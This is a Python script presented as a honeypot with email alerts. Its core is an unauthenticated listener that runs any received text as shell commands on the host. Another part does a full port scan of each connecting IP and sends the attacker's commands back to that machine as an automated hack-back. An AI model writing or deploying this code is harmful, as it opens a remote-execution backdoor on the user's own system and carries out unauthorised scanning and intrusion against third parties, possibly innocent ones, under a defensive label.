import socket
import threading
import subprocess
import time
import random
import smtplib
import asyncio
import logging
from email.message import EmailMessage

logging.basicConfig(filename="honeypot.log", level=logging.INFO)

def create_honeypot(port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] Listening for incoming connections on port {port}")

    while True:
        conn, addr = s.accept()
        attacker_ip = addr[0]
        print(f"[*] Detected intrusion attempt from {attacker_ip}")
        logging.info(f"Intrusion attempt detected from {attacker_ip}")

        # Launch a new thread to handle the attacker
        attacker_handler_thread = threading.Thread(target=mirror_attacker, args=(attacker_ip, conn))
        attacker_handler_thread.start()

        # Send email notification
        send_email_notification(attacker_ip)

def mirror_attacker(attacker_ip: str, conn: socket.socket):
    print(f"[*] Mirroring attacker's actions on their machine ({attacker_ip})")

    while True:
        try:
            command = conn.recv(1024)
            if not command or command.decode().strip() == "exit":
                break

            output = subprocess.check_output(command.decode(), shell=True)
            conn.send(output)

            # Execute the same command on the attacker's machine
            execute_on_attacker(attacker_ip, command.decode())
        except Exception as e:
            print(f"Error: {e}")
            break

    conn.close()

def execute_on_attacker(attacker_ip: str, command: str):
    open_ports = asyncio.run(async_scan_ports(attacker_ip))
    for port in open_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((attacker_ip, port))
            s.send(command.encode())
            s.close()
            break
        except Exception as e:
            print(f"Error executing command on attacker's machine: {e}")

async def async_scan_port(ip: str, port: int) -> bool:
    open_port = False
    try:
        reader, writer = await asyncio.open_connection(ip, port, ssl=None)
        open_port = True
        writer.close()
        await writer.wait_closed()
    except Exception as e:
        pass

    return open_port

async def async_scan_ports(ip: str, start_port: int = 1, end_port: int = 65535) -> list:
    open_ports = []
    tasks = [async_scan_port(ip, port) for port in range(start_port, end_port + 1)]

    results = await asyncio.gather(*tasks)
    for port, is_open in enumerate(results, start=start_port):
        if is_open:
            open_ports.append(port)

    return open_ports

def send_email_notification(attacker_ip: str):
    email_address = "your_email@example.com"
    email_password = "your_email_password"
    smtp_server = "smtp.example.com"
    smtp_port = 587

    msg = EmailMessage()
    msg.set_content(f"Intrusion attempt detected from {attacker_ip}")

    msg["Subject"] = "Honeypot Alert"
    msg["From"] = email_address
    msg["To"] = email_address

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email_address, email_password)
            server.send_message(msg)

        print(f"[*] Email notification sent for intrusion attempt from {attacker_ip}")
    except Exception as e:
        print(f"Error sending email notification: {e}")
        logging.error(f"Error sending email notification: {e}")

if __name__ == "__main__":
    honeypot_port = 5555
    create_honeypot(honeypot_port)

   
